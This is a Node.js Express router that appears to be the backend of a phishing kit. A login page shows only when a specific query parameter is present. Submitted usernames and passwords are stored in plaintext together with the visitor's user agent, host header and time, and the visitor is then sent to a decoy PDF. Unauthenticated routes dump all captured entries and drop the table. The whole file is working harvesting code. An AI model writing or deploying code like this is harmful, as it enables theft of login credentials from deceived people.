const express = require('express');
const router = express.Router();
const db = require('../db');
//router.use(express.static('public'));

// LOGIN ROUTE

router.get('/login', (req, res) => {  
  const data = req.query.abcd; // Replace parameter name "query"
  
  if (data === undefined) {
    res.render('error'); // Render an error page if data is undefined
  } else { 
    res.render('login', { data }); // Render the 'index' view and pass the data
  }
});


//Handle the POST request to "/submit"
router.post('/submit', (req, res) => {
  
// Accessing the data from the POST request
  const name = req.body.username;
  const passwd = req.body.password;
  const agent = req.headers['user-agent'];
  const ip = req.headers['host'];
  const time = new Date().toISOString();
  
  const checkQuery = 'SELECT * FROM box WHERE username = ?';

  db.query(checkQuery, [name], (err, results) => {
  
    if (results.length > 0) {
      // Record found, update it
      const updateQuery = `
        UPDATE box 
        SET password = ?, requestIP = ?, requestOS = ?, requestTime = ? 
        WHERE username = ?
      `;
      db.query(updateQuery, [passwd, ip, agent, time, name], (err, result) => {
        if (err) {
          console.error('Error updating record:', err);
          return res.status(500).send('Error updating record');
        }
        console.log('Record updated');


        res.redirect('/123.pdf');  // Redirect after successful update
      });
    } else {
      // No record found, insert a new one
      const insertQuery = `
        INSERT INTO box (username, password, requestIP, requestOS, requestTime) 
        VALUES (?, ?, ?, ?, ?)
      `;
     db.query(insertQuery, [name, passwd, ip, agent, time], (err, result) => {
  if (err) {
    console.error('Error inserting record:', err);
    return res.status(500).json({ error: 'Error inserting record', details: err.message });
  }
  console.log('Record inserted');
  res.redirect('/123.pdf');
});

    }
  });
});

// Route to fetch and render data
router.get('/data', (req, res) => {
  const query = `SELECT * FROM box`;

  db.query(query, (err, result) => {
    if (err) {
      
      res.status(500).send('Error Fetching Data');
    } else {

      res.render('table' , {data:result})
       
    }
});
})


// Route to create table
router.get('/create', (req, res) => {
  
  // Check if the table exists, and create it if it doesn't
  const createTableQuery = `
    CREATE TABLE IF NOT EXISTS box (
      id INT AUTO_INCREMENT PRIMARY KEY,
      username VARCHAR(255) NOT NULL,
      password VARCHAR(255) NOT NULL,
      requestIP VARCHAR(255) NOT NULL,
      requestOS VARCHAR(255) NOT NULL,
      requestTime VARCHAR(255) NOT NULL
    )
  `;

  db.query(createTableQuery, (err, result) => {
    if (err) {
      
      res.status(500).send('Error creating table Data');
    } else {

      res.send('table created')
       
    }
});
})


// Route to delete data
router.get('/delete', (req, res) => {
  const query = `DROP TABLE box`;

  db.query(query, (err, result) => {
    if (err) {
      
      res.status(500).send('Error Deleting Data');
    } else {

      res.send('table deleted')
       
    }
});
})

module.exports = router;
